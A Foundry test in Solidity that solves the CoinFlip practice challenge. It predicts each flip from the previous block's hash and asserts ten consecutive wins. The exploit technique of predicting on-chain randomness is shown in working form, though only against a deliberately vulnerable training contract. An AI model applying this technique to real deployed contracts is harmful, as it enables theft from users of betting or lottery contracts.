pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {CoinFlipAttack} from "../src/CoinFlipAttack.sol";

contract CoinFlipTest is Test {
    CoinFlip public coin;
    CoinFlipAttack public coinAttack;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        coin = new CoinFlip();
        coinAttack = new CoinFlipAttack();
    }

    function testCoinFlip() public {
        for (uint256 blockNumber = 100; blockNumber < 110; ++blockNumber) {
            vm.roll(blockNumber);

            uint256 blockValue = uint256(blockhash(blockNumber - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool guess = coinFlip == 1 ? true: false;

            bool result = coin.flip(guess);

            assert(result == true);
        }

        assert(coin.consecutiveWins() == 10);
    }
}